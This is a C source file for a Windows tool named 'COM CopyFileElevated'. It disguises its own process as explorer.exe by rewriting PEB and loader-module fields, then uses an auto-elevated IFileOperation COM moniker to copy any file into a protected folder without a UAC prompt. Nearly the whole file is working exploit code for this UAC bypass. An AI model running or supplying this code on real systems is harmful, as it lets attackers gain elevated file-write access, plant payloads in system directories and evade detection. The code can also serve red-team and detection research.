/**
 * Mozilla Public License (MPL) Version 2.0.
 * 
 * Copyright (c) 2024 Tijme Gommers (@tijme).
 * 
 * This source code file is licensed under Mozilla Public 
 * License (MPL) Version 2.0, and you are free to use, modify, 
 * and distribute this file under its terms. However, any 
 * modified versions of this file must include this same 
 * license and copyright notice.
 */

/**
 * Standard Input Output.
 * 
 * Defines three variable types, several macros, and various functions for performing input and output.
 * https://www.tutorialspoint.com/c_standard_library/stdio_h.htm
 */
#include <stdio.h>

/**
 * Standard Library.
 * 
 * Defines four variable types, several macros, and various functions for performing general functions.
 * https://www.tutorialspoint.com/c_standard_library/stdlib_h.htm
 */
#include <stdlib.h>

/**
 * Integers.
 * 
 * Defines macros that specify limits of integer types corresponding to types defined in other standard headers.
 * https://pubs.opengroup.org/onlinepubs/009696899/basedefs/stdint.h.html
 */
#include <stdint.h>

/**
 * Booleans.
 * 
 * Defines boolean types.
 * https://pubs.opengroup.org/onlinepubs/007904975/basedefs/stdbool.h.html
 */
#include <stdbool.h>

/**
 * Windows API.
 * 
 * Contains declarations for all of the functions, macro's & data types in the Windows API.
 * https://docs.microsoft.com/en-us/previous-versions//aa383749(v=vs.85)?redirectedfrom=MSDN
 */
#include <windows.h>

/**
 * Windows Shell COM.
 * 
 * Defines interfaces and functions for shell objects, such as namespace extensions and file operations.
 * https://learn.microsoft.com/en-us/windows/win32/api/shobjidl/
 */
#include <shobjidl.h>

/**
 * Windows Shell.
 * 
 * Provides functions for simple operations on strings, paths, and other shell-related utilities in Windows.
 * https://learn.microsoft.com/en-us/windows/win32/api/shlwapi/
 */
#include <shlwapi.h>

/**
 * Windows User
 * 
 * USER procedure declarations, constant definitions and macros
 * https://learn.microsoft.com/en-us/windows/win32/api/winuser/
 */
#include <winuser.h>

/**
 * Internal NT API's and data structures.
 * 
 * Helper library that contains NT API's and data structures for system services, security and identity.
 * https://docs.microsoft.com/en-us/windows/win32/api/winternl/
 */
#include <winternl.h>

/**
 * Windows Update Agent API
 * 
 * https://docs.microsoft.com/en-us/windows/win32/api/wuapi/
 */
#define COBJMACROS
#include <wuapi.h>

/**
 * Include dynamic libraries.
 */
#pragma comment(lib, "uuid.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "shlwapi.lib")

/**
 * Convert the given char array to a wide char array.
 * 
 * @param const char* str The source string.
 * @return wchar_t* The resulting wide char array.
 */
wchar_t* ConvertToWideString(const char* str) {
    int length = MultiByteToWideChar(CP_ACP, 0, str, -1, NULL, 0);

    wchar_t* result = (wchar_t*) malloc(length * sizeof(wchar_t));
    
    if (result) {
        MultiByteToWideChar(CP_ACP, 0, str, -1, result, length);
    }

    return result;
}

/**
 * Get current Process Environment Block.
 *
 * @return PEB* The current PEB.
 */
void* NtGetPeb() {
    #ifdef _M_X64
        return (void*) __readgsqword(0x60);
    #elif _M_IX86
        return (void*) __readfsdword(0x30);
    #else
        #error "This architecture is currently unsupported"
    #endif
}

/**
 * Masquerade the current PEB to look like 'explorer.exe'.
 *
 * @return int Zero if succesfully executed, any other integer otherwise.
 */
int masqueradePEB() {
    printf("\t- Defining local structs.\n");

    /**
     * Define local PEB LDR DATA
     */
    typedef struct _PEB_LDR_DATA {
        ULONG Length;
        BOOLEAN Initialized;
        HANDLE SsHandle;
        LIST_ENTRY InLoadOrderModuleList;
        LIST_ENTRY InMemoryOrderModuleList;
        LIST_ENTRY InInitializationOrderModuleList;
        PVOID EntryInProgress;
        BOOLEAN ShutdownInProgress;
        HANDLE ShutdownThreadId;
    } PEB_LDR_DATA, * PPEB_LDR_DATA;

    /**
     * Define local RTL USER PROCESS PARAMETERS
     */
    typedef struct _RTL_USER_PROCESS_PARAMETERS {
        BYTE           Reserved1[16];
        PVOID          Reserved2[10];
        UNICODE_STRING ImagePathName;
        UNICODE_STRING CommandLine;
    } RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

    /**
     * Define partial local PEB
     */
    typedef struct _PEB {
        BOOLEAN InheritedAddressSpace;
        BOOLEAN ReadImageFileExecOptions;
        BOOLEAN BeingDebugged;
        union
        {
            BOOLEAN BitField;
            struct
            {
                BOOLEAN ImageUsesLargePages : 1;
                BOOLEAN IsProtectedProcess : 1;
                BOOLEAN IsLegacyProcess : 1;
                BOOLEAN IsImageDynamicallyRelocated : 1;
                BOOLEAN SkipPatchingUser32Forwarders : 1;
                BOOLEAN SpareBits : 3;
            };
        };
        HANDLE Mutant;

        PVOID ImageBaseAddress;
        PPEB_LDR_DATA Ldr;
        PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
        PVOID SubSystemData;
        PVOID ProcessHeap;
        PRTL_CRITICAL_SECTION FastPebLock;
    } PEB, * PPEB;

    /**
     * Define local LDR DATA TABLE ENTRY
     */
    typedef struct _LDR_DATA_TABLE_ENTRY {
        LIST_ENTRY InLoadOrderLinks;
        LIST_ENTRY InMemoryOrderLinks;
        union
        {
            LIST_ENTRY InInitializationOrderLinks;
            LIST_ENTRY InProgressLinks;
        };
        PVOID DllBase;
        PVOID EntryPoint;
        ULONG SizeOfImage;
        UNICODE_STRING FullDllName;
        UNICODE_STRING BaseDllName;
        ULONG Flags;
        WORD LoadCount;
        WORD TlsIndex;
        union
        {
            LIST_ENTRY HashLinks;
            struct
            {
                PVOID SectionPointer;
                ULONG CheckSum;
            };
        };
        union
        {
            ULONG TimeDateStamp;
            PVOID LoadedImports;
        };
    } LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

    typedef NTSTATUS(NTAPI* _RtlEnterCriticalSection) (PRTL_CRITICAL_SECTION CriticalSection);
    typedef NTSTATUS(NTAPI* _RtlLeaveCriticalSection) (PRTL_CRITICAL_SECTION CriticalSection);
    typedef void (WINAPI* _RtlInitUnicodeString)(PUNICODE_STRING DestinationString, PCWSTR SourceString);

    _RtlEnterCriticalSection RtlEnterCriticalSection = (_RtlEnterCriticalSection) GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlEnterCriticalSection");
    if (RtlEnterCriticalSection == NULL) {
        printf("Could not find RtlEnterCriticalSection.\n");
        return 1;
    }

    _RtlLeaveCriticalSection RtlLeaveCriticalSection = (_RtlLeaveCriticalSection) GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlLeaveCriticalSection");
    if (RtlLeaveCriticalSection == NULL) {
        printf("Could not find RtlLeaveCriticalSection.\n");
        return 1;
    }

    _RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString) GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlInitUnicodeString");
    if (RtlInitUnicodeString == NULL) {
        printf("Could not find RtlInitUnicodeString.\n");
        return 1;
    }

    printf("\t- Getting 'explorer.exe' path.\n");
    WCHAR chExplorerPath[MAX_PATH];
    GetWindowsDirectoryW(chExplorerPath, MAX_PATH);
    wcscat_s(chExplorerPath, sizeof(chExplorerPath) / sizeof(wchar_t), L"\\explorer.exe");
    LPWSTR pwExplorerPath = (LPWSTR) malloc(MAX_PATH);
    wcscpy_s(pwExplorerPath, MAX_PATH, chExplorerPath);

    printf("\t- Getting current PEB.\n");
    PEB* peb = (PEB*) NtGetPeb();

    RtlEnterCriticalSection(peb->FastPebLock);

    printf("\t- Masquerading ImagePathName and CommandLine.\n");

    RtlInitUnicodeString(&peb->ProcessParameters->ImagePathName, chExplorerPath);
    RtlInitUnicodeString(&peb->ProcessParameters->CommandLine, chExplorerPath);

    PLDR_DATA_TABLE_ENTRY pStartModuleInfo = (PLDR_DATA_TABLE_ENTRY) peb->Ldr->InLoadOrderModuleList.Flink;
    PLDR_DATA_TABLE_ENTRY pNextModuleInfo = (PLDR_DATA_TABLE_ENTRY) peb->Ldr->InLoadOrderModuleList.Flink;

    WCHAR wExeFileName[MAX_PATH];
    GetModuleFileNameW(NULL, wExeFileName, MAX_PATH);

    do {
        if (_wcsicmp(wExeFileName, pNextModuleInfo->FullDllName.Buffer) == 0) {
            printf("\t- Masquerading FullDllName and BaseDllName.\n");
            RtlInitUnicodeString(&pNextModuleInfo->FullDllName, pwExplorerPath);
            RtlInitUnicodeString(&pNextModuleInfo->BaseDllName, pwExplorerPath);
            break;
        }

        pNextModuleInfo = (PLDR_DATA_TABLE_ENTRY) pNextModuleInfo->InLoadOrderLinks.Flink;
    } while (pNextModuleInfo != pStartModuleInfo);

    RtlLeaveCriticalSection(peb->FastPebLock);
    return 0;
}

/**
 * Copy the given source file to given destination, using IFileOperation.
 * 
 * @param PCWSTR pszSrcPath The source file to copy.
 * @param PCWSTR pszDstFolder The destination folder to copy the source file to.
 * @param PCWSTR pszDstName The new name of the file in the destination folder.
 * @return HRESULT If he operation succeeded.
 */
HRESULT ComCopyFile(PCWSTR pszSrcPath, PCWSTR pszDstFolder, PCWSTR pszDstName) {
    HRESULT hResult;
    IFileOperation* iFileOperation = NULL;

    IBindCtx* iBindContext = NULL;
    IMoniker* iMoniker = NULL;
    BIND_OPTS3 sBindingOpts;

    IShellItem* iSrcShellItem = NULL;
    IShellItem* iDstShellItem = NULL;

    // Initializing COM 
    hResult = CoInitialize(NULL);
    if (FAILED(hResult)) {
        printf("[!] Failed to run CoInitializeEx: 0x%X.\n", hResult);
        goto CLEANUP_AND_RETURN;
    }

    // Create IFileOperation interface instance
    hResult = CoCreateInstance(&CLSID_FileOperation, NULL, CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER, &IID_IFileOperation, (void**) &iFileOperation);
    if (FAILED(hResult)) {
        printf("[!] Failed to run CoCreateInstance: 0x%X.\n", hResult);
        goto CLEANUP_AND_RETURN;
    }

    iFileOperation->lpVtbl->Release(iFileOperation);

    // Bind the moniker to get the IFileOperation interface
    RtlSecureZeroMemory(&sBindingOpts, sizeof(sBindingOpts));
    sBindingOpts.cbStruct = sizeof(sBindingOpts);
    sBindingOpts.dwClassContext = CLSCTX_LOCAL_SERVER;
    hResult = CoGetObject(L"Elevation:Administrator!new:{3ad05575-8857-4850-9277-11b85bdb8e09}", (BIND_OPTS*) &sBindingOpts, &IID_IFileOperation, (void**) &iFileOperation);
    if (FAILED(hResult)) {
        printf("[!] Failed to run CoGetObject: 0x%X.\n", hResult);
        goto CLEANUP_AND_RETURN;
    }

    // Create source shell item
    hResult = SHCreateItemFromParsingName(pszSrcPath, NULL, &IID_IShellItem, (void**) &iSrcShellItem);
    if (FAILED(hResult)) {
        printf("[!] Failed to run SHCreateItemFromParsingName (%S): 0x%X.\n", pszSrcPath, hResult);
        goto CLEANUP_AND_RETURN;
    }

    // Create destination shell item
    hResult = SHCreateItemFromParsingName(pszDstFolder, NULL, &IID_IShellItem, (void**) &iDstShellItem);
    if (FAILED(hResult)) {
        printf("[!] Failed to run SHCreateItemFromParsingName (%S): 0x%X.\n", pszDstFolder, hResult);
        goto CLEANUP_AND_RETURN;
    }

    // Copy the actual file
    hResult = iFileOperation->lpVtbl->CopyItem(iFileOperation, iSrcShellItem, iDstShellItem, pszDstName, NULL);
    if (FAILED(hResult)) {
        printf("[!] Failed to run CopyItem: 0x%X.\n", hResult);
        goto CLEANUP_AND_RETURN;
    }

    hResult = iFileOperation->lpVtbl->PerformOperations(iFileOperation);

CLEANUP_AND_RETURN:
    if (iDstShellItem != NULL) iDstShellItem->lpVtbl->Release(iDstShellItem);
    if (iSrcShellItem != NULL) iSrcShellItem->lpVtbl->Release(iSrcShellItem);
    if (iFileOperation != NULL) iFileOperation->lpVtbl->Release(iFileOperation);
    if (iMoniker != NULL) iMoniker->lpVtbl->Release(iMoniker);
    if (iBindContext != NULL) iBindContext->lpVtbl->Release(iBindContext);
    CoUninitialize();

RETURN:
    return hResult;
}

/**
 * Instruct program to copy one file to another.
 *
 * @param int argc Amount of arguments in argv.
 * @param char** Array of arguments passed to the program.
 */
void main(int argc, char** argv) {
    puts("COM CopyFileElevated v1.0!\n");

    if (argc != 4) {
        printf("[!] Usage: %s <source file path> <destination folder> <destination file name>\n", argv[0]);
        return;
    }

    wchar_t* pszSrcPath = ConvertToWideString(argv[1]);
    wchar_t* pszDstFolder = ConvertToWideString(argv[2]);
    wchar_t* pszDstName = ConvertToWideString(argv[3]);

    puts("[+] Trying to copy file using IFileOperation COM interface.");

    if (SUCCEEDED(masqueradePEB())) {
        printf("[+] Successfully masqueraded PEB.\n");
    } else {
        printf("[+] Failed to masquerade PEB.\n");
    }

    if (SUCCEEDED(ComCopyFile(pszSrcPath, pszDstFolder, pszDstName))) {
        printf("[+] Successfully copied %S to %S\\%S.\n", pszSrcPath, pszDstFolder, pszDstName);
    } else {
        printf("[+] Failed to copy %S to %S\\%S.\n", pszSrcPath, pszDstFolder, pszDstName);
    }
}